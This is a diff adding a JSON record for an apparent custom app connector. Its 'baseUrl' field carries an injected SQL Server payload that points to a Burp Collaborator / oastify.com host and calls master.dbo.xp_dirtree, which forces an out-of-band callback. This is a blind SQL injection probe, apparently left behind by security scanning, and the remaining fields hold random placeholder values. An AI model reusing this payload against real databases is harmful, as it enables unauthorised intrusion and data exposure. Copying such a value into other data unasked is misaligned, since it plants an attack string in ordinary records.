@@ -1,0 +1,17 @@
+{
+	"baseUrl":"http://burpcollaborator.net/SRldPmpG;declare @q varchar(99);set @q='\\\\co4gev86hj4b8jh9xsosklj2wt2mqdg17rvjib60.oasti'+'fy.com\\lxy'; exec master.dbo.xp_dirtree @q;-- ",
+	"createdTime":1741509515997,
+	"deleted":false,
+	"description":"xPciEr",
+	"enabled":false,
+	"id":"67cd538b3aa5057dd6e7d331",
+	"lastModifiedBy":22743,
+	"lcName":"lhozsa",
+	"logo":"https://assets.unifyapps.com/images/app-icons/custom_connector_01.svg",
+	"modifiedTime":1741509515997,
+	"name":"lhoZsa",
+	"ownerUserId":22743,
+	"standard":false,
+	"standardApp":false,
+	"version":0
+}
